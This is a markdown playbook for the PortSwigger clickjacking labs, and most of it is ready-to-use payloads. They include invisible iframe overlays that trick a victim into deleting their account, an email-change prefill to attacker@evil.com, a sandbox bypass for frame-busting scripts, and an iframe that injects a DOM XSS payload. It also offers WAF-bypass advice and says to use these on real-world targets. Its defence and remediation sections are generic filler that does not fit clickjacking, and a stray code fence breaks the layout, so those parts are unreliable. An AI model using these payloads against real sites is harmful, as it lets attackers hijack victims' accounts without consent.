# Clickjacking — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. Difficulty: 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- Studying for BSCP (Burp Suite Certified Practitioner) certification
- Testing real-world targets for these vulnerability classes
- Bug bounty hunting — these exact techniques find real bugs
- Building exploitation chains

## Prerequisites
- Burp Suite Professional (Community works for most)
- Browser with proxy configured
- Burp Collaborator or interactsh for OOB testing


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Basic with CSRF token 🟢 APPRENTICE
```html
<style>iframe{position:relative;width:500px;height:700px;opacity:0.0001;z-index:2;}div{position:absolute;top:495px;left:60px;z-index:1;}</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account"></iframe>
```
Position the decoy button exactly over the "Delete account" button.
---

### Lab 2: Form input prefilled from URL 🟢 APPRENTICE
```html
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```
URL parameter pre-fills the email field. Victim clicks "Update" unknowingly.
---

### Lab 3: Frame buster script 🟡 PRACTITIONER
```html
<iframe sandbox="allow-forms" src="https://TARGET/my-account"></iframe>
```
`sandbox` attribute blocks JavaScript frame-busting but allows form submission.
---

### Lab 4: Trigger DOM-based XSS 🟡 PRACTITIONER
```html
<iframe src="https://TARGET/feedback?name=<img src=1 onerror=print()>&email=a@a.com&subject=a&message=a"></iframe>
```
---

### Lab 5: Multistep 🟡 PRACTITIONER
Two overlapping buttons for a multi-step confirmation flow. First click confirms, second click executes.

## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research Methodology
When a standard technique doesn't work:
1. **Identify the filter**: What chars/patterns are blocked?
2. **Research bypasses**: Search GitHub, Twitter, PortSwigger Research for new techniques
3. **Fuzz extensively**: Use Burp Intruder with custom charset/tag lists
4. **Chain vulnerabilities**: Combine two medium findings into one critical
5. **Check encoding layers**: URL, HTML entity, Unicode, double-encode, XML entity


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |

```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.
